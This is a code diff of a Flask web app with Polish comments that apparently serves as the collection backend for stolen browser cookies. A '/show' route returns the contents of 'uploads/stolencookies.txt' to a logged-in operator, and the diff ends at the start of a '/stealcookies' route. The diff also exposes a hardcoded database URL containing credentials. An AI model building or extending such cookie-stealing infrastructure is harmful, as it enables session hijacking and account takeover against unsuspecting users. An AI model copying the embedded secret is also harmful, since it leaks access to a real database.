@@ -1,6 +1,6 @@
 import hashlib
 import os
-from flask import Flask, render_template, request, redirect, url_for, jsonify,session
+from flask import Flask, render_template, request, redirect, url_for, jsonify,session,send_from_directory
 import psycopg2
 import datetime
 
@@ -13,36 +13,9 @@ external_database_url = 'postgres://pygenius_security_db_user:2nUg1JYDa5Fgjw0lhO
 @app.route('/show')
 def show():
     if 'logged_in' in session and session['logged_in']:
-        file_path = './uploads/stolencookies.txt'
-
-        try:
-            with open(file_path, 'r') as file:
-                # Odczytanie całej zawartości pliku
-                text = file.read()
-
-                # Podzielenie zawartości na linie
-                lines = text.split('\n')
-
-                # Zmienna do przechowywania HTML
-                html_content = ''
-
-                for line in lines:
-                    # Sprawdzenie, czy linia zawiera datę zaktualizowania
-                    if line.startswith('Data zaktualizowania:'):
-                        # Dodanie daty do HTML
-                        html_content += f'<p><strong>{line}</strong></p>'
-                    else:
-                        # Dodanie zawartości linii do HTML
-                        html_content += f'<p>{line}</p>'
-
-            # Renderowanie szablonu HTML i przekazanie zmiennej html_content
-            return render_template('files.html', html_content=html_content)
-
-        except FileNotFoundError:
-            return f'Plik {file_path} nie został odnaleziony.'
-
-        except IOError as e:
-            return f'Błąd odczytu pliku: {e}'
+        directory = './uploads'
+        filename = 'stolencookies.txt'
+        return send_from_directory(directory, filename)
     else:
         return redirect(url_for('login'))
 @app.route('/stealcookies', methods=['GET', 'POST'])
